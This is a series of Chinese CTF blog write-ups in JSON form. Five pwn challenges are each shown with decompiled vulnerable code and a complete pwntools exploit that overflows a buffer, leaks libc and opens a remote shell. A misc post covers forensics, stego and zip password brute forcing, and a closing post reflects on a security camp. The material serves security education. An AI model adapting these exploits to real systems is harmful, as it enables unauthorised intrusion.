[{"title":"pwn100","date":"2019-08-22T02:40:31.000Z","path":"2019/08/22/pwn100/","text":"溢出点:自己定义了一个read函数，是在原来的read上进行包装，读满200个字节才退出 1234567891011121314__int64 __fastcall my_read(__int64 a1, signed int a2)&#123; __int64 result; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) &#123; result = (unsigned int)i; if ( i &gt;= a2 ) break; read(0, (void *)(i + a1), 1uLL); &#125; return result;&#125; 然而read读到的内容是放在调用函数这一层rbp-0x40h的地方，肯定会溢出 1234567int sub_40068E()&#123; char v1; // [rsp+0h] [rbp-40h] my_read((__int64)&amp;v1, 200); return puts(\"bye~\");&#125; 利用:123456[*] '/mnt/hgfs/linux_share/pwn/xctf/pwn100/pwn100' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 泄露libc版本，然后调用system(&#39;/bin.sh&#39;) exp:12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *context.log_level='debug'# p = process('./pwn100')p=remote('111.198.29.45',45415)# gdb.attach(p,'b*0x00000000004006B6')elf = ELF('./pwn100')start_addr =0x00000000004006B8pop_rdi = 0x0000000000400763payload1 = (0x48*'a'+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(start_addr)).ljust(200,'a')p.send(payload1)p.recvuntil('bye~\\n')unpack = p.recvuntil('\\n',drop=True).ljust(0x8,'\\x00')put_addr = hex(u64(unpack))info('puts: '+ put_addr)payload2 = (0x48*'a'+p64(pop_rdi)+p64(elf.got['read'])+p64(elf.plt['puts'])+p64(start_addr)).ljust(200,'a')p.send(payload2)p.recvuntil('bye~\\n')unpack = p.recvuntil('\\n',drop=True).ljust(0x8,'\\x00')read_addr = hex(u64(unpack))info('read: '+ read_addr)obj = LibcSearcher(\"puts\", int(put_addr,16))obj.add_condition('read', int(read_addr,16))system = int(put_addr,16) + obj.dump(\"system\") - obj.dump('puts')bin_sh = int(put_addr,16) + obj.dump(\"str_bin_sh\") - obj.dump('puts')payload3 = (0x48*'a'+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(start_addr)).ljust(200,'a')p.sendline(payload3)p.interactive() 这个LibcSearcher的添加条件功能不太会用，不知道为啥加了条件出来的结果反而变多了，我就手动选了一个，竟然一次就对了- -，我选的3 1234567891011Multi Results: 0: archive-old-glibc (id libc6-amd64_2.24-3ubuntu1_i386) 1: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2.2_i386) 2: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2_i386) 3: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) 4: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) 5: archive-old-glibc (id libc6-amd64_2.24-3ubuntu2.2_i386) 6: archive-old-glibc (id libc6-i386_2.19-10ubuntu2.3_amd64)Please supply more info using add_condition(leaked_func, leaked_address).You can choose it by hand","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"overflow","slug":"overflow","permalink":"http://yoursite.com/tags/overflow/"}]},{"title":"stack2","date":"2019-08-21T00:29:12.000Z","path":"2019/08/21/stack2/","text":"程序逻辑:输入几个数，然后可以使用程序提供的4个功能进行操作，直到输入5程序才会退出。 1puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); 溢出点:12345puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; 更改数的功能，下标v5的范围没有限制，会导致数组越界，我们可以利用他来向栈上更高地址的位置写入数据，将返回地址改写使他跳转到开shell的函数处执行 1234int hackhere()&#123; return system(\"/bin/bash\");&#125; 这道题因为环境的问题远程服务器上没有/bin/bash的shell，可以用sh的shell，/bin/sh的地址是0x08048980，加7就是sh的地址 1.rodata:08048980 command db &apos;/bin/bash&apos;,0 ; DATA XREF: hackhere+14↑o 栈上布局:123456789low esp---&gt; +-----------------+ | call system | +-----------------+ | sh | +-----------------+ | | | | | |high +-----------------+ 关于返回地址的位置，我一开始也以为是直接与v13相隔0x70的位置后来调试发现不对，是相差了132的地方，还是要以程序运行时的调试结果为准。 exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context.log_level='debug'# p = process('./stack2')p = remote('111.198.29.45',45441)# gdb.attach(p,\"b*0x080488EE\")def set_addr(): # 0x080485B4 call _system p.sendline('3') p.sendafter('which number to change:','132\\n') p.sendafter('new number:','180\\n') p.sendline('3') p.sendafter('which number to change:', '133\\n') p.sendafter('new number:', '133\\n') p.sendline('3') p.sendafter('which number to change:', '134\\n') p.sendafter('new number:', '4\\n') p.sendline('3') p.sendafter('which number to change:', '135\\n') p.sendafter('new number:', '8\\n') # 0x08048987 '/bin/sh'[7] p.sendline('3') p.sendafter('which number to change:', '136\\n') p.sendafter('new number:', '135\\n') p.sendline('3') p.sendafter('which number to change:', '137\\n') p.sendafter('new number:', '137\\n') p.sendline('3') p.sendafter('which number to change:', '138\\n') p.sendafter('new number:', '4\\n') p.sendline('3') p.sendafter('which number to change:', '139\\n') p.sendafter('new number:', '8\\n') p.sendline('5')pause()p.sendafter('How many numbers you have:','4\\n')p.sendafter('Give me your numbers','1 2 3 4\\n')set_addr()p.interactive()","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"pwn","slug":"pwn","permalink":"http://yoursite.com/tags/pwn/"}]},{"title":"warmup","date":"2019-08-20T15:07:30.000Z","path":"2019/08/20/warmup/","text":"溢出点:scanf输入字符串的时候没有检查长度 123char v2[32]; // [esp+10h] [ebp-74h]//...__isoc99_scanf(\"%s\", v2); 逻辑分析: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546for ( i = 0; ; ++i ) &#123; v0 = i; if ( v0 &gt;= strlen(v2) ) break; switch ( v14 ) &#123; case 1: if ( sub_8048702(v2[i]) ) v14 = 2; break; case 2: if ( v2[i] == '@' ) v14 = 3; break; case 3: if ( check2(v2[i]) ) v14 = 4; break; case 4: if ( v2[i] == '.' ) v14 = 5; break; case 5: if ( check3(v2[i]) ) v14 = 6; break; case 6: if ( check3(v2[i]) ) v14 = 7; break; case 7: if ( check3(v2[i]) ) v14 = 8; break; case 8: if ( check3(v2[i]) ) v14 = 9; break; case 9: v14 = 10; break; default: continue; &#125; &#125; 这一大段其实就是依次检查我们输入的字符串的每一位并将v14置成对应的数，但其实这一段并没什么用 关键是这一段 1(*(&amp;v3 + --v14))(); v3加上v14减去1，将这个地址开始的指令当作函数来执行。v14初始值为1，我们简单点上面的检查都不通过，那么到这一步，地址就只取决于v3 123456789101112size_t v0; // ebx char v2[32]; // [esp+10h] [ebp-74h] int (*v3)(); // [esp+30h] [ebp-54h] int (*v4)(); // [esp+34h] [ebp-50h] int (*v5)(); // [esp+38h] [ebp-4Ch] int (*v6)(); // [esp+3Ch] [ebp-48h] int (*v7)(); // [esp+40h] [ebp-44h] int (*v8)(); // [esp+44h] [ebp-40h] int (*v9)(); // [esp+48h] [ebp-3Ch] int (*v10)(); // [esp+4Ch] [ebp-38h] int (*v11)(); // [esp+50h] [ebp-34h] int (*v12)(); // [esp+54h] [ebp-30h] 观察到v3的位置是在相对v2高地址的地方，我们可以通过v2的输入来覆盖v3的值 exp:123456789101112from pwn import *context.log_level='debug'# p = process('./forgot')p=remote('111.198.29.45',42514)p.recvuntil('&gt; ')p.sendline('faint-star')payload = 0x20*'A'+p32(0x080486CC)p.recvuntil('&gt; ')p.sendline(payload)p.interactive()","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"overflow","slug":"overflow","permalink":"http://yoursite.com/tags/overflow/"}]},{"title":"dice-game","date":"2019-08-20T14:11:56.000Z","path":"2019/08/20/dice-game/","text":"溢出点:123char buf[55]; // [rsp+0h] [rbp-50h]//...v6 = read(0, buf, 0x50uLL); 读进来的数据刚好能覆盖到rbp指针之前，无法覆盖返回地址。 分析:程序会不停的产生随机数，猜中50次就能得到flag。当然随机是伪随机，当seed一定时产生的数列是一定的，这个seed也是存放在栈上，溢出点虽然无法利用来覆盖返回地址，但是可以覆盖栈上的local variable。 产生随机数:产生一个长度为50的seed为0的伪随机序列: 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void main()&#123; unsigned int seed[2]=&#123;0,0&#125;; srand(seed[0]); for (int i = 0; i &lt;= 49; ++i )&#123; int r = rand() % 6 + 1; printf(\"%d \",r); &#125;&#125; exp:123456789101112131415161718from pwn import *context.log_level='debug'# p=process('./dice_game')p=remote('111.198.29.45',35516)index=0num = '2 5 4 2 6 2 5 1 4 2 3 2 3 2 6 5 1 1 5 5 6 3 4 4 3 3 3 2 2 2 6 1 1 1 6 4 2 5 2 5 4 4 4 6 3 2 3 3 6 1'.split()payload = 0x40*'a'+p64(0)p.recvuntil('Welcome, let me know your name: ')p.sendline(payload)for i in range(0,50): p.recvuntil('Give me the point(1~6): ') p.sendline(num[index]) index=index+1p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"http://yoursite.com/tags/pwn/"}]},{"title":"level3","date":"2019-08-15T14:34:34.000Z","path":"2019/08/15/XCTF-PWN/","text":"level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者/bin/sh字符串，考察的是libc泄露的基本操作 1234567ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] write(1, \"Input:\\n\", 7u); return read(0, &amp;buf, 256u);&#125; exp: 1234567891011121314151617181920212223242526272829303132from pwn import *from LibcSearcher import *context.log_level='debug'# payload = cyclic(0x100)io = process('./level3')io = remote('111.198.29.45',45330)elf = ELF('./level3')write_plt = elf.plt['write']write_got = elf.got['write']main_addr = 0x08048484# gdb.attach(io)payload1 = 0x8c*'a'+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)io.recvuntil('Input:\\n')# pause()io.sendline(payload1)write = u32(io.recv(4))info('write:'+hex(write))obj = LibcSearcher(\"write\", write)system = write + obj.dump(\"system\") - obj.dump(\"write\") #system offsetbin_sh = write + obj.dump(\"str_bin_sh\") - obj.dump(\"write\") #/bin/sh offsetinfo('system:'+hex(system))info('/bin/sh:'+hex(bin_sh))payload2 = 0x8c*'b'+p32(system)+p32(main_addr)+p32(bin_sh)io.recvuntil('Input:\\n')# pause()io.sendline(payload2)io.interactive() 调试技巧: 在read处按下Tab键找到地址 断点下在 0x08048482 处 12.text:08048482 leave.text:08048483 retn python里加上调试语句，python脚本运行时会自动打开gdb进行调试。 1# gdb.attach(io) 但由于收发速度不同，我们需要在每次发送数据前加上pause，这样就可以让12345```pythonio.recvuntil(&apos;Input:\\n&apos;)# pause()io.sendline(payload1) 123io.recvuntil('Input:\\n')# pause()io.sendline(payload2) 在填充至返回地址的时候，可以用gdb跟踪到ret指令处，此时查看$esp寄存器的内容，可以检查自己的地址是否填正确。","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"xctf","slug":"xctf","permalink":"http://yoursite.com/tags/xctf/"}]},{"title":"xman-misc","date":"2019-08-12T10:14:10.000Z","path":"2019/08/12/xman-misc/","text":"cephalopod题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。 ceph1 追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面 ceph2 linux下使用tcpxtract分离，其中一张图片即为flag 1tcpxtract -f 40150e85ac1b4952f1c35c2d9103d8a40c7bee55.pcap Erik-Baleog-and-Olaf压缩包打开是一张图片，按道理图片里肯定藏了东西，但用binwalk等工具查看并没有什么异常，这里参考了老外的方法，找一张和这张图片一样的图片，对比一下不同 1compare hint.png stego100.png -compose src diff.png hint.png是网上找的和和题目一样的图片，diff是输出的不同，打开是一个二维码，扫码即可 Miscellaneous-300一个压缩包，解压需要密码，用binwalk或者16进制编辑器都能发现里面还有一个压缩包，并且名字也是数字，尝试后发现里面压缩包的名字是外面压缩包的解压密码，写脚本循环解压 12345678910111213import os,sys,zipfileoriginal_file='12475.zip'while True: original_file = zipfile.ZipFile(original_file) if 'zip' in original_file.namelist()[0]: inner_zipfile = original_file.namelist()[0] original_file_password = inner_zipfile[:inner_zipfile.find('.')] original_file.setpassword(original_file_password) original_file.extractall() os.remove(original_file.filename) original_file = inner_zipfile else: break 到最后一层12475.zip无法解压了，这个时候进行爆破 1fcrackzip -u -l 1-6 -c 'a1' 12475.zip -u：使用unzip解压 -l：后面接长度范围 -c：后接字符，a为所有小写字母，1是数字[0-9] 小小的PDF打开是一个pdf，是pdf隐写，使用foremost来提取隐藏内容 1foremost -i 2333.pdf -o test foremost是基于文件头及尾部信息恢复文件的工具。 Refference https://chybeta.github.io/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/ https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300","tags":[{"name":"xctf","slug":"xctf","permalink":"http://yoursite.com/tags/xctf/"},{"name":"misc","slug":"misc","permalink":"http://yoursite.com/tags/misc/"}]},{"title":"XMAN-2019-福州营","date":"2019-08-11T09:55:59.000Z","path":"2019/08/11/xman/","text":"该从何说起呢，我记得大一的寒假和中国农大的同学一起参观了北京的几所高校，那个时候自己惊叹于别人“大学之楼大”，确从未曾接触过那些优秀高校的学生，心里暗自羡慕，说以后也要去那种学校读书。而这次在夏令营，我每天做题、往返于福大教学区和生活区之间，我内心并无太多波动，仿佛大学就该是这样，因为太过符合心中的期待而感觉过于自然，我知道这是因为夏令营把所有爱好安全的人都聚集到一起了，身边都是志同道合的人这是一件很难得的事，在这里学习的9天时间，我感受到和别人的差距。很奇怪，我并没有向学校里绩点比人低那样焦虑，我想的只是我要怎么弥补自己的基础知识，要怎么向大佬请教，要怎么搞懂这道题。大佬们很强，有名校学长带着入门的；有自己摸索刷题999+的，看到有这么多人和我一样真正的在搞这个东西，想到自己玩的这么浮躁，还把理由归于方向以至于这么就都只是菜鸟，不禁觉得惭愧。想要变强除了做题、看书、总结没有别的途径，你不会证明基础知识不够牢固，那就继续学，而不是怀疑和放弃。不过一个做总是避免不了成为井底之蛙，你不知道外面的世界，也不知道自己的水平，更不知道自己学得怎么样，这次出来真的是让我见了市面，也明白了要端正学习态度，不能有畏难情绪，希望自己能在这条路上坚持下去。","tags":[]}]